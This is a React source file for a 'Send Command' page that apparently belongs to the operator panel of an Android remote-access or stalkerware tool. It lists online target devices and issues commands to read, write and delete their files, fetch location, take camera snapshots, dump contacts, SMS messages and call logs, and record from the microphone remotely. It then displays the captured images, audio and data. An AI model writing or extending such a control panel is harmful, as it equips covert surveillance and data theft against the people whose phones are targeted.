import React, { useEffect, useState } from 'react';
import { useSearchParams } from 'react-router-dom';
import DevicePicker from '../components/DevicePicker';
import Icon from '../components/ui/Icon';
import { useDevices } from '../hooks/useDevices';
import { parseCommandData, runCommand } from '../lib/commandRunner';
import { looksLikeImagePayload, toAudioDataUrl, toImageDataUrl } from '../lib/media';

const COMMAND_GROUPS = [
    {
        label: 'Device',
        options: [
            { value: 'get_device_info', label: 'device.info', params: false },
            { value: 'get_foreground_app', label: 'device.foreground', params: false },
        ],
    },
    {
        label: 'Storage',
        options: [
            { value: 'file_get_directory', label: 'storage.roots', params: false },
            { value: 'file_list', label: 'file.list', params: 'path' },
            { value: 'file_read', label: 'file.read', params: 'path' },
            { value: 'file_write', label: 'file.write', params: 'json' },
            { value: 'file_delete', label: 'file.delete', params: 'path' },
            { value: 'file_rename', label: 'file.rename', params: 'json' },
        ],
    },
    {
        label: 'Location',
        options: [
            { value: 'get_location', label: 'location.get', params: false },
        ],
    },
    {
        label: 'Camera',
        options: [{ value: 'camera_snapshot', label: 'camera.capture', params: 'camera' }],
    },
    {
        label: 'Contacts',
        options: [{ value: 'get_contacts', label: 'contacts.list', params: false }],
    },
    {
        label: 'SMS',
        options: [{ value: 'get_sms_messages', label: 'sms.inbox', params: 'json' }],
    },
    {
        label: 'Call Logs',
        options: [{ value: 'get_call_logs', label: 'calllogs.sync', params: 'json' }],
    },
    {
        label: 'Remote Audio',
        options: [
            { value: 'mic_start', label: 'audio.record.start', params: 'json' },
            { value: 'mic_stop', label: 'audio.record.stop', params: false },
        ],
    },
];

const FLAT_ORDERS = COMMAND_GROUPS.flatMap((g) => g.options);

export default function OrdersPage() {
    const [searchParams, setSearchParams] = useSearchParams();
    const { devices, loading } = useDevices({ onlineOnly: true });
    const [deviceId, setDeviceId] = useState(() => searchParams.get('device') || '');
    const [orderType, setOrderType] = useState(FLAT_ORDERS[0].value);
    const [paramsText, setParamsText] = useState('');
    const [sending, setSending] = useState(false);
    const [result, setResult] = useState(null);

    const spec = FLAT_ORDERS.find((o) => o.value === orderType);

    useEffect(() => {
        setParamsText(defaultParams(spec));
    }, [orderType]);

    useEffect(() => {
        if (deviceId) {
            setSearchParams({ device: deviceId }, { replace: true });
        }
    }, [deviceId, setSearchParams]);

    const sendOrder = async () => {
        if (!deviceId) {
            alert('Choose a device.');
            return;
        }
        setSending(true);
        setResult({ loading: true });
        try {
            const payload = buildParams(spec, paramsText);
            const status = await runCommand(deviceId, orderType, payload, 120);
            setResult(formatResult(status));
        } catch (err) {
            setResult({ ok: false, error: err.message || 'Failed to send order' });
        } finally {
            setSending(false);
        }
    };

    const clearResult = () => setResult(null);

    return (
        <div className="hybrid-op-shell">
            <div className="cmd-page">
                <div className="suite-topbar">
                    <span className="suite-topbar-title">Send Command</span>
                    <span className="suite-badge">
                        <span className="suite-badge-dot online" />
                        Synchronous POST
                    </span>
                    <span className="suite-topbar-spacer" />
                </div>
                <div className="cmd-grid">
                    <div className="cmd-card">
                        <div className="cmd-card-head">
                            <h3>
                                <Icon name="orders" size={20} />
                                Command
                            </h3>
                        </div>
                        <div className="cmd-card-body">
                            <div className="cmd-field">
                                <label htmlFor="cmd-device-select">Target device</label>
                                <DevicePicker
                                    id="cmd-device-select"
                                    variant="hybrid"
                                    devices={devices}
                                    value={deviceId}
                                    onChange={setDeviceId}
                                    loading={loading}
                                    onlineOnly
                                    placeholder="Select a device…"
                                />
                            </div>
                            <div className="cmd-field">
                                <label htmlFor="cmd-type">Command</label>
                                <select id="cmd-type" value={orderType} onChange={(e) => setOrderType(e.target.value)}>
                                    {COMMAND_GROUPS.map((group) => (
                                        <optgroup key={group.label} label={group.label}>
                                            {group.options.map((o) => (
                                                <option key={o.value} value={o.value}>
                                                    {o.label}
                                                </option>
                                            ))}
                                        </optgroup>
                                    ))}
                                </select>
                            </div>
                            {spec?.params && (
                                <div className="cmd-field">
                                    <label htmlFor="cmd-params">Parameters</label>
                                    <textarea
                                        id="cmd-params"
                                        rows={4}
                                        value={paramsText}
                                        onChange={(e) => setParamsText(e.target.value)}
                                        placeholder={paramHint(spec.params)}
                                    />
                                </div>
                            )}
                            <button type="button" className="fb-btn fb-btn-primary" onClick={sendOrder} disabled={sending || !deviceId}>
                                {sending ? (
                                    <>
                                        <Icon name="spinner" size={16} className="spin" /> Sending…
                                    </>
                                ) : (
                                    <>
                                        <Icon name="send" size={16} /> Send command
                                    </>
                                )}
                            </button>
                        </div>
                    </div>

                    <div className="cmd-card">
                        <div className="cmd-card-head">
                            <h3>Command result</h3>
                            <button type="button" className="fb-btn-sm" onClick={clearResult}>
                                Clear
                            </button>
                        </div>
                        <div className="cmd-result-body">
                            {!result && <p className="suite-muted">Send a command to see results</p>}
                            {result?.loading && (
                                <div className="fb-loading">
                                    <Icon name="spinner" size={24} className="spin" />
                                </div>
                            )}
                            {result && !result.loading && (
                                <>
                                    <div className={`cmd-result-badge ${result.ok ? 'ok' : 'bad'}`}>
                                        <Icon name={result.ok ? 'success' : 'error'} size={16} />
                                        {result.ok ? 'Success' : 'Failure'}
                                        {result.at && <span className="suite-muted"> · {result.at}</span>}
                                    </div>
                                    {result.preview}
                                    <pre className="cmd-json">{result.json}</pre>
                                </>
                            )}
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}

function defaultParams(spec) {
    if (!spec?.params) return '';
    if (spec.params === 'path') return '/storage/emulated/0';
    if (spec.params === 'camera') return 'back';
    if (spec.params === 'json') return '{"limit":100}';
    return '';
}

function paramHint(kind) {
    if (kind === 'path') return 'Path e.g. /storage/emulated/0/Download';
    if (kind === 'camera') return 'back or front';
    if (kind === 'json') return 'JSON object or path|content pipe syntax';
    return '';
}

function buildParams(spec, text) {
    if (!spec?.params) return {};
    const trimmed = text.trim();
    if (spec.params === 'path') return { path: trimmed || '/' };
    if (spec.params === 'camera') return { camera: trimmed || 'back' };
    if (spec.params === 'json') {
        if (!trimmed) return {};
        if (trimmed.includes('|')) {
            const [path, content] = trimmed.split('|');
            return { path: path.trim(), content: content.trim() };
        }
        try {
            return JSON.parse(trimmed);
        } catch {
            return { query: trimmed };
        }
    }
    return {};
}

function formatResult(status) {
    const ok = status.status === 'success';
    const data = parseCommandData(status.data);
    const at = new Date().toLocaleString();
    let preview = null;
    let json = '';

    if (ok && data != null) {
        const imageUrl =
            (looksLikeImagePayload(status.data) && toImageDataUrl(status.data)) ||
            (looksLikeImagePayload(data) && toImageDataUrl(data)) ||
            null;
        const audioUrl =
            toAudioDataUrl(
                typeof data === 'object' ? data.audio || data.audio_base64 : null
            ) || null;

        if (imageUrl) {
            preview = <img className="order-preview-img" src={imageUrl} alt="capture" />;
        } else if (audioUrl) {
            preview = <audio controls src={audioUrl} />;
        }
        json = JSON.stringify(redactLargeFields(data), null, 2);
    } else {
        json = status.error || status.error_message || JSON.stringify(status, null, 2);
    }

    return { ok, at, preview, json, loading: false };
}

function redactLargeFields(obj) {
    if (obj == null || typeof obj !== 'object') return obj;
    if (Array.isArray(obj)) return obj.map(redactLargeFields);
    const out = {};
    for (const [k, v] of Object.entries(obj)) {
        if (typeof v === 'string' && v.length > 200) {
            out[k] = `[${v.length} chars omitted]`;
        } else {
            out[k] = redactLargeFields(v);
        }
    }
    return out;
}
